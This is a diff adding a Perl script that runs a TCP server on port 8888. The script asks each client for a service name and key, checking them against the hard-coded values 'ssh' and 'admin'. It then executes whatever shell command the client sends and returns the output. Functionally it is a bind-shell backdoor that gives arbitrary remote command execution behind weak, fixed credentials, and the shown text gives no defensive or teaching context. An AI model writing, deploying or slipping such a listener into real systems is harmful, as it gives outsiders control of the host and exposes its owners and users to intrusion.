@@ -1,0 +1,102 @@
+#!/usr/bin/perl -w
+
+use strict;
+use IO::Socket;
+use POSIX qw(WNOHANG);
+
+## configure ##
+my $server_port = '8888';
+my $service_name = "ssh";
+my $communication_key = "admin";
+###############
+
+## Init ##
+my $client_answer;
+##########
+
+## Action Sub ##
+my $command_action = sub {
+	my @command_return;
+	eval {
+	@command_return = `$_[0]` #|| die "$!\n"
+	};
+	if ($@) {
+		return $@;
+	} else {
+		return @command_return;
+	}
+};
+################
+
+## Reaped Child ##
+$SIG{'CHLD'} = sub {
+     while((my $pid = waitpid(-1, WNOHANG)) >0) {
+          print "Reaped child $pid\n";
+      }
+};
+#$SIG{'CHLD'} = 'IGNORE'; 
+##################
+
+## Define Socket ##
+my $server = IO::Socket::INET->new( LocalPort	=> $server_port,
+								Type		=> SOCK_STREAM,
+								Reuse		=> 1,
+								Proto		=> 'tcp',
+								Timeout		=> 30*1,
+								Listen		=> 20)
+	or die "Couldn't be a tcp server on port $server_port: $!\n";
+###################
+
+## Main Loop ##
+#warn "Starting Server on Port $server_port\n";
+while (1) {
+	## Accept user connect ##
+	next unless my $client = $server->accept;
+	## Fork process ##
+	defined (my $pid = fork) or die "Can't fork: $!\n";
+
+	if ($pid ==0) {
+		## Get Client IP ##
+		my $peer = gethostbyaddr($client->peeraddr, AF_INET) || $client->peerhost;
+		## Get Client Port ##
+		my $port = $client->peerport;
+		warn "Connection from $peer:$port\n";
+		## Flush Socket ##
+		$client->autoflush(1);
+		## Send to Client ##
+		print $client "service_name:\n";
+		## Get answer from socket ##
+		chomp ($client_answer = <$client>);
+		## Test Username ##
+		if ( "$client_answer" eq crypt($service_name,$client_answer) ) {
+			print $client "keys:\n";
+			#print "user = $client_answer\n";
+			## Get password from socket ##
+			chomp ($client_answer = <$client>);
+			#print "password = $client_answer\n";
+				if ( "$client_answer" eq crypt($communication_key,$client_answer) ) {
+					print $client "ok,go ahead\n";
+					chomp ($client_answer = <$client>);
+					my @command_status = $command_action->($client_answer) if (defined $client_answer);
+					print $client "@command_status\n";
+					#$client->shutdown(1);
+					close $client;
+					warn "Connection from $peer:$port finished\n";
+					exit 0;
+				} else {
+					print $client "Bad Keys\n";
+					warn "Bad Auth Keys, Drop it\n";
+					close $client;
+					exit 0;
+				}
+		} else {
+			print $client "Bad service_name\n";
+			warn "Bad service_name, Drop it\n";
+			close $client;
+			exit 0;
+		}
+	}
+}
+
+close ($server);
+#################
